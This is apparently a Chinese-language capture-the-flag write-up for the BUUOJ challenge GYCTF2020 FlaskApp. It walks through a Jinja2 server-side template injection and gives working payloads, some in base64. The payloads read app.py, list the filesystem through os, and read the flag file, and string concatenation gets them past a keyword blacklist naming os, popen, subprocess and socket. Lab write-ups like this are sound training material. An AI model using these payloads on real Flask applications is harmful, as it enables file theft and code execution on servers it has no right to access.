# [GYCTF2020]FlaskApp

[题目地址](https://buuoj.cn/challenges#[GYCTF2020]FlaskApp)

从这道题的[wp](https://blog.csdn.net/Alexhcf/article/details/108400293)发现了一个很不错的仓库。

网站一个大大的flask图标，flask=注入！先把白给的提示看了。

```html
<body>
    <div align="center">
        <h3>失败乃成功之母！！</h3>
        <!-- PIN --->
        <img src="/static/img/hint.png" height="450" width="600">
    </div>
</body>
```

想到flask的debug界面PIN码getshell。尝试让它报个错，加密页面不行，解密页面倒是很简单，输入个1就报错了。PIN码需要读取文件才能算出来，需要先找到注入点才行。加密界面输入`{{1+1}}`没东西；解密界面输`{{1+1}}`更是报错。正确的做法是在加密界面把`{{1+1}}`加密后，把得到的结果放入解密界面。

- e3sxKzF9fQ==

结果显示2，对头了。在之前的debug界面得知了脚本的名字`app.py`，读取一下看看有什么东西。当我用[这里](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---read-remote-file)的payload尝试读取时，发现报jinja2.exceptions.UndefinedError。看来不能无脑抄，要[学习](https://blog.csdn.net/weixin_44214568/article/details/124125565)一下jinja2的语法。

```
jinja2一共三种语法：
控制结构 {% %}
变量取值 {{ }}
注释 {# #}
jinja2的Python模板解释器在构建的时候考虑到了安全问题，删除了大部分敏感函数，相当于构建了一个沙箱环境。但是一些内置函数和属性还是依然可以使用，而Flask的SSTI就是利用这些内置函数和属性相互组建来达到调用函数的目的，从而绕过沙箱。

__class__         返回调用的参数类型
__bases__         返回基类列表
__mro__           此属性是在方法解析期间寻找基类时的参考类元组
__subclasses__()  返回子类的列表
__globals__       以字典的形式返回函数所在的全局命名空间所定义的全局变  量 与 func_globals 等价
__builtins__      内建模块的引用，在任何地方都是可见的(包括全局)，每个 Python 脚本都会自动加载，这个模块包括了很多强大的 built-in 函数，例如eval, exec, open等等
```

看来要换一个payload，跟着wp找到了[这个](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---remote-code-execution)。根据我们的情况改动后：

```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}{% endif %}{% endfor %}
```

[\_\_name__](https://www.zhihu.com/question/49136398)是Python的一个内置属性，分以下两种情况：

1. 若是在当前文件，\_\_name__ 是__main__。
2. 若是导入的文件，__name__是模块名

payload使用jinja2的语法，for语句是`{% 语句内容 %}{% endfor %}`，if语句相似，`{% if 判断条件 %}{语句内容}{% endif %}`。payload意思应该是，遍历`[].__class__.__base__.__subclasses__()`的内容到c中，如果c的`__name__`是catch_warnings，就利用`c.__init__.__globals__['__builtins__']`找到file类。使用open和read函数读取app.py。

- eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignYXBwLnB5JywncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9

不知道为啥读取出来的文件无法用网站美化。还好wp直接给了最重要的waf函数。

```python
def waf(str): 
  black_list = [ &
    #34;flag&# 34;, & #34;os&# 34;, & #34;system&# 34;, &
    #34;popen&# 34;, & #34;import&# 34;, & #34;eval&# 34;, &
    #34;chr&# 34;, & #34;request&# 34;, & #34;subprocess&# 34;, &
    #34;commands&# 34;, & #34;socket&# 34;, & #34;hex&# 34;, &
    #34;base64&# 34;, & #34;*&# 34;, & #34;?&# 34;
]
  for x in black_list: 
    if x in str.lower(): 
      return 1
```

过滤方式是直接遍历黑名单，然后判断输入的str的小写是否在黑名单里。这种过滤就很没用，简单的一个拼接就绕过了。

```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}{% endif %}{% endfor %}
```

`c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s')`打开os模块并绕过过滤，此举是为了调用listdir函数。

- eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ11bJ19faW1wJysnb3J0X18nXSgnbycrJ3MnKS5saXN0ZGlyKCcvJyl9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9

发现this_is_the_flag.txt。直接读取。

```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt','r').read()}}{% endif %}{% endfor %}
```

- eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL3RoaXNfaXNfdGhlX2ZsJysnYWcudHh0JywncicpLnJlYWQoKX19eyUgZW5kaWYgJX17JSBlbmRmb3IgJX0=

这些payload在没有wp的情况下都需要一个一个试。整体思路是通过`[]`,`''`等的`__class__`，`mro()`引出全部类的父类object，然后通过`__subclasses__()`引出有用的诸如file，os等模块执行命令注入或者读取。很多时候不知道哪一个才是，这就要慢慢试了。

这题的PIN码解法懒得看了。知道怎么读取flag文件后读取用户网卡那些文件就不难了，生成PIN码也就是一个脚本的事。

## Flag
> flag{9007496d-e6bd-4da8-9d38-fdf3dd19ad2b}